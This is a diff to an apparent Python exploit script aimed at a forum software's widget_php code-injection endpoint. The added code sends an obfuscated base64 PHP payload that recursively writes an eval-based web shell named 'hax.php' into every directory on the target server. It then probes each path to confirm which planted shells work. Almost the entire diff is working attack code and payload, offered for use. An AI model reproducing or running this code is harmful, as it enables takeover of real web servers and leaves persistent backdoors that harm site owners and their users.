@@ -57,7 +57,62 @@ I have it here as just a block of encoded payload because its static and does no
     print "{>} Database User: %s" %(data['user'])
     print "{>} Database Pass: %s" %(data['pass'])
 
+def equifax_mode(url):
+    equifax = "ZXJyb3JfcmVwb3J0aW5nKDApOwokZmlsZW5hbWUgPSAiL2hheC5waHAiOwpmdW5jdGlvbiBleHBh"
+    equifax += "bmREaXJlY3RvcmllcygkYmFzZV9kaXIpIHsKICAgICAgJGRpcmVjdG9yaWVzID0gYXJyYXkoKTsK"
+    equifax += "ICAgICAgZm9yZWFjaChzY2FuZGlyKCRiYXNlX2RpcikgYXMgJGZpbGUpIHsKICAgICAgICAgICAg"
+    equifax += "aWYoJGZpbGUgPT0gJy4nIHx8ICRmaWxlID09ICcuLicpIGNvbnRpbnVlOwogICAgICAgICAgICAk"
+    equifax += "ZGlyID0gJGJhc2VfZGlyLkRJUkVDVE9SWV9TRVBBUkFUT1IuJGZpbGU7CiAgICAgICAgICAgIGlm"
+    equifax += "KGlzX2RpcigkZGlyKSkgewogICAgICAgICAgICAgICAgJGRpcmVjdG9yaWVzIFtdPSAkZGlyOwog"
+    equifax += "ICAgICAgICAgICAgICAgJGRpcmVjdG9yaWVzID0gYXJyYXlfbWVyZ2UoJGRpcmVjdG9yaWVzLCBl"
+    equifax += "eHBhbmREaXJlY3RvcmllcygkZGlyKSk7CiAgICAgICAgICAgIH0KICAgICAgfQogICAgICByZXR1"
+    equifax += "cm4gJGRpcmVjdG9yaWVzOwp9CgpmdW5jdGlvbiBmaWxlZHJvcHBlcigkZGlyZWN0b3J5LCAkZmls"
+    equifax += "ZW5hbWUpIHsKICAgICR3cml0ZV9wYXRoID0gJGRpcmVjdG9yeS4kZmlsZW5hbWU7CiAgICBlY2hv"
+    equifax += "ICR3cml0ZV9wYXRoLiIsIjsKICAgICR4ID0gZm9wZW4oJHdyaXRlX3BhdGgsICJ3KyIpOwogICAg"
+    equifax += "JHNoZWxsID0gIlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYk1WMHBPejgrIjsKICAgIGZ3cml0ZSgk"
+    equifax += "eCwgYmFzZTY0X2RlY29kZSgkc2hlbGwpKTsKICAgIGZjbG9zZSgkeCk7Cn0KZWNobyAiPGNyaW1l"
+    equifax += "PiI7CiRkaXJlY3RvcmllcyA9IGV4cGFuZERpcmVjdG9yaWVzKGRpcm5hbWUoX19GSUxFX18pKTsK"
+    equifax += "Zm9yZWFjaCAoICRkaXJlY3RvcmllcyBhcyAkZGlyZWN0b3J5ICkgewogICAgZmlsZWRyb3BwZXIo"
+    equifax += "JGRpcmVjdG9yeSwgJGZpbGVuYW1lKTsKfQplY2hvICI8L2NyaW1lPiI7CmRpZSgpOwo="
+    php = "eval(base64_decode($_POST['shellcode']));exit;"
+    print "{+} Doing the shell spray, this will be messy."
+    target_url = url + "/ajax/render/widget_tabbedcontainer_tab_panel"
+    data = {"subWidgets[0][template]": "widget_php",
+            "subWidgets[0][config][code]": php,
+            "shellcode": equifax}
+    r = requests.post(url=target_url, data=data, verify=False)
+    output = r.text
+    try:
+        lol = re.findall("<crime>(.*?)</crime>", output)
+    except Exception, e:
+        print e
+        sys.exit("{-} Bailing.")
+    if len(lol):
+        blob = lol[0]
+    else:
+        sys.exit("{-} Failed to find our paths, sorry mate.")
+    paths = blob.split(",")
+    print "{*} Got %d paths to try..." %(len(paths))
+    remote_cwd = execute_php(url=url, php="echo posix_getcwd();exit;")
+    print "{*} Using remote CWD: %s" %(remote_cwd)
+    potential_shells = []
+    for path in paths:
+        potential_shell = path.replace(remote_cwd, url)
+        potential_shells.append(potential_shell)
+    return potential_shells
 
+def check_shell(potential_shell):
+    print "{+} Checking %s" %(potential_shell)
+    data = {"1": "echo md5('hacked');"}
+    needle = "4d4098d64e163d2726959455d046fd7c"
+    try:
+        r = requests.post(potential_shell, data=data, verify=False)
+    except:
+        return False
+    if needle in r.text:
+        print "{>} Your shell is at: %s" %(potential_shell)
+    else:
+        print "{-} Nope, not found shell"
 
 def exploit(url):
     print "{+} Checking %s" %(url)
@@ -65,7 +120,11 @@ def exploit(url):
         sys.exit("{-} Target not exploitable :(")
     print "{+} Proceeding..."
     gather_info(url)
-    # call execute_php(url, php) here with your payload
+    # now we summon equifax mode and spray shells!
+    potential_shells = equifax_mode(url)
+    for potential_shell in potential_shells:
+        check_shell(potential_shell)
+    print "{+} Done!"
 
 def main(args):
     if len(args) != 2:
